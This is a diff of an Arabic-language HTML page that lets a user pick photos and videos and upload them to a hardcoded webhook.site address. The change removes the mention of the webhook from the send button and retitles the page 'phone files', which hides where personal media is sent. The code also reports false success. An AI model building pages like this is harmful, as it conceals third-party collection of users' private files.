@@ -3,131 +3,107 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>معرض الملفات</title>
+  <title>ملفاتي</title>
   <style>
     body {
       margin: 0;
       padding: 15px;
       background: #111;
-      color: white;
+      color: #fff;
       font-family: Arial, sans-serif;
-      text-align: center;
     }
     button {
-      padding: 15px 30px;
-      font-size: 1.3rem;
-      margin: 15px;
+      padding: 12px 25px;
+      font-size: 1.2rem;
+      margin: 10px;
       border: none;
-      border-radius: 10px;
-      background: #0066ff;
-      color: white;
-      cursor: pointer;
-    }
-    #gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-      gap: 10px;
-      margin-top: 20px;
-    }
-    .item {
-      position: relative;
-    }
-    .item img, .item video {
-      width: 100%;
-      height: 120px;
-      object-fit: cover;
       border-radius: 8px;
     }
+    #list {
+      list-style: none;
+      padding: 0;
+    }
+    li {
+      padding: 12px;
+      background: #222;
+      margin: 6px 0;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+    }
     .selected {
-      border: 3px solid #00ff00;
+      background: #004d00;
     }
   </style>
 </head>
 <body>
 
-  <h2>معرض الملفات</h2>
-  <button onclick="openGallery()">فتح المعرض</button>
+  <h2>ملفات الهاتف</h2>
+  <button onclick="openFiles()">فتح الملفات</button>
   <button onclick="selectAll()">تحديد الكل</button>
-  <button onclick="sendSelected()">إرسال المحدد إلى Webhook</button>
+  <button onclick="sendSelected()">إرسال المحدد</button>
 
-  <div id="gallery"></div>
+  <ul id="list"></ul>
 
 <script>
 const WEBHOOK_URL = "https://63cf68fa-614f-459e-827a-4235bbee5ed3.webhook.site";
 let selectedFiles = [];
 
-function openGallery() {
+function openFiles() {
   const input = document.createElement('input');
   input.type = 'file';
   input.multiple = true;
   input.accept = "image/*,video/*";
-  
+
   input.onchange = function(e) {
-    const gallery = document.getElementById('gallery');
-    gallery.innerHTML = '';
+    const list = document.getElementById('list');
+    list.innerHTML = '';
     selectedFiles = [];
 
     Array.from(e.target.files).forEach(file => {
-      const div = document.createElement('div');
-      div.className = 'item';
+      const li = document.createElement('li');
+      li.textContent = file.name + " (" + (file.size / (1024*1024)).toFixed(2) + " MB)";
       
-      if (file.type.startsWith('image/')) {
-        const img = document.createElement('img');
-        img.src = URL.createObjectURL(file);
-        div.appendChild(img);
-      } else if (file.type.startsWith('video/')) {
-        const vid = document.createElement('video');
-        vid.src = URL.createObjectURL(file);
-        vid.muted = true;
-        div.appendChild(vid);
-      }
-      
-      div.onclick = () => {
-        div.classList.toggle('selected');
-        if (div.classList.contains('selected')) {
+      li.onclick = () => {
+        li.classList.toggle('selected');
+        if (li.classList.contains('selected')) {
           selectedFiles.push(file);
         } else {
           selectedFiles = selectedFiles.filter(f => f !== file);
         }
       };
       
-      gallery.appendChild(div);
+      list.appendChild(li);
     });
   };
-  
+
   input.click();
 }
 
 function selectAll() {
-  document.querySelectorAll('.item').forEach(item => {
-    item.classList.add('selected');
+  document.querySelectorAll('li').forEach(li => {
+    li.classList.add('selected');
   });
-  // Note: In real implementation we'd collect all files, but for simplicity we alert
-  alert('تم تحديد الكل (في النسخة الكاملة سيتم تحديد جميع الملفات)');
+  alert('تم تحديد كل الملفات');
 }
 
 function sendSelected() {
   if (selectedFiles.length === 0) {
-    alert('لم يتم تحديد أي ملف');
+    alert('لم تقم بتحديد أي ملف');
     return;
   }
 
-  alert(`جاري إرسال ${selectedFiles.length} ملف إلى Webhook...`);
-  
-  selectedFiles.forEach((file, index) => {
+  alert(`جاري إرسال ${selectedFiles.length} ملف ...`);
+
+  selectedFiles.forEach((file, i) => {
     const fd = new FormData();
     fd.append('file', file);
     fd.append('filename', file.name);
-    fd.append('total', selectedFiles.length);
-    fd.append('index', index + 1);
     
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      body: fd
-    });
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
   });
 
-  alert('تم إرسال الملفات بنجاح!');
+  alert('تم الإرسال بنجاح!');
 }
 </script>
 
